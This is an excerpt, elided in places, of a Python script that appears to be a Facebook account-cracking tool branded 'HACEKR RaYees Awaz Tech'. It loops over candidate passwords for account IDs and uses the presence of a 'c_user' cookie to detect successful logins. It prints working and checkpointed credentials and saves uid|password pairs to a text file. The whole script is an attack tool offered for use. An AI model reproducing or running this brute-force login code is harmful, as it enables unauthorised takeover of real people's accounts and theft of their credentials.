		...
		\x1b[1;97m🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹
		\033[1;31m         HACEKR RaYees Awaz Tech  💛👈 \33[0m
		\x1b[1;97m🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔹
		\033[1;32m[+] 𝗔𝗨𝗧𝗛𝗢𝗥 | Awaz
		\033[1;33m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 | Mohammad Tanha 
		\033[1;34m[+] 𝗚𝗜𝗧𝗛𝗨𝗕  | Mohammad Tanha  
		...
		def riaz():
			...
			if riaz1 =='4':
				os.system('xdg-open https://www.facebook.com/AwazTech');riaz()
			if riaz1 =='2':
				bangla()
			else:
		    ...
		    try:
		        for ps in pwx:
		            ...
		            if 'c_user' in log_cookies:
		                ...
		                cid = coki[151:166]
		                print('\033[1;32m[MR™Awaz-OK] '+cid+'|'+ps+'\033[0;97m')
		                ...
		                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
		                cid = coki[141:152]
		                print('\033[1;31m[MR™Awaz-CP] '+cid+' | '+ps+'\x1b[1;97m')
		                open('MR™Awaz-CP.txt', 'a').write(uid+' | '+ps+'\n')
		                cps.append(cid)
		                break
		            else:
		                continue
		        loop+=1
		        sys.stdout.write(f'\r[\033[1;97mMR.MR™Awaz\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
		        sys.stdout.flush()
		    except:
		        pass
